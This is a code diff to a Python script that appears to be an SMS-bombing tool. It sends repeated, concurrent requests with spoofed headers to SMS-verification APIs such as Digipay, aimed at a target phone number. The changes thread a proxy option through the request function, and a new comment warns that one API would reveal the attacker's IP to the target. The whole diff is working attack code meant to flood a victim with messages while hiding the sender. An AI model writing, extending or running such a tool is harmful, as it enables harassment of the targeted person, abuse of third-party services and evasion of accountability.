@@ -12,13 +12,17 @@ from colorama import Fore, Style
 headers = Headers()
 
 
-def send_request(api_name, api_url, data, timeout):
+def send_request(api_name, api_url, data, timeout, proxy=None):
     generated_headers = headers.generate()
     current_time = datetime.now().strftime("%H:%M:%S")
 
     try:
         response = requests.post(
-            api_url, headers=generated_headers, json=data, timeout=timeout
+            api_url,
+            headers=generated_headers,
+            json=data,
+            timeout=timeout,
+            proxies=proxy,
         )
         response.raise_for_status()
 
@@ -27,8 +31,8 @@ def send_request(api_name, api_url, data, timeout):
         return f"{Fore.YELLOW}[{current_time}] {Fore.RED}[-] {api_name}:{Style.RESET_ALL} Failed - {e}"
 
 
-def process_target(api):
-    return send_request(api["name"], api["url"], api["data"], timeout=5)
+def process_target(api, proxy):
+    return send_request(api["name"], api["url"], api["data"], timeout=5, proxy=proxy)
 
 
 def sigint_handler(signal, frame):
@@ -57,7 +61,7 @@ def main():
         default=5,
     )
     parser.add_argument(
-        "-v", "--verbose", help="Display additional info", action="store_true"
+        "-v", "--verbose", help="Display additional info. -v", action="store_true"
     )
     parser.add_argument("-x", "--proxy", help="Set the proxy for requests (http/https)")
 
@@ -71,6 +75,9 @@ def main():
 
     if proxy:
         print(f"Using proxy: {proxy}")
+        proxy_dict = {"http": proxy, "https": proxy}
+    else:
+        proxy_dict = None
 
     apis = [
         {
@@ -280,7 +287,7 @@ def main():
         #     "name": "Digipay",
         #     "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
         #     "data": {"cellNumber": phone_number},
-        # },
+        # }, # This one will send your IP to your target.
     ]
 
     try:
@@ -289,7 +296,8 @@ def main():
                 max_workers=process_num
             ) as executor:
                 futures = [
-                    executor.submit(process_target, api) for api in apis * bombing_times
+                    executor.submit(process_target, api, proxy_dict)
+                    for api in apis * bombing_times
                 ]
 
                 for future in concurrent.futures.as_completed(futures):
